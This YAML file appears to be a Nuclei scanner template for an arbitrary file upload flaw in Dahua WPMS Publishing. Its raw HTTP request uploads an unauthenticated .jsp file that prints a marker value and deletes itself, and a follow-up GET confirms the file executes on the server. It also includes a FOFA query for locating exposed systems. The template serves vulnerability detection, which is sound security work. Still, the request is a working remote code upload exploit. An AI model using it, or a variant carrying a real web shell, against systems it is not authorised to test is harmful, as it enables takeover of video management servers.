http:
- extractors:
  - group: 1
    internal: true
    name: uploadfile
    part: body
    regex:
    - VIDEO/(\d+\.jsp)
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '2468642'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /publishing/publishing/material/file/video HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im
    age/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7

    Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

    Accept-Encoding: gzip, deflate

    Connection: close


    --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

    Content-Disposition: form-data; name="Filedata"; filename="{{filename}}"


    <% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete();
    %>

    --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--


    --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

    Content-Disposition: form-data; name="Submit"


    --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--

    '
  - 'GET /publishingImg/VIDEO/{{uploadfile}} HTTP/1.1

    Host: {{Hostname}}

    '
id: dahua-wpms-publishing-fileupload
info:
  author: Co5mos
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  description: Dahua WPMS Publishing arbitrary file upload vulnerability.
  metadata:
    fofa-query: "app=\"dahua-\u667A\u6167\u56ED\u533A\u7EFC\u5408\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 2
  name: Dahua WPMS - Arbitrary File Upload
  severity: critical
  tags: dahua,fileupload
variables:
  filename: '{{rand_base(6)}}.jsp'
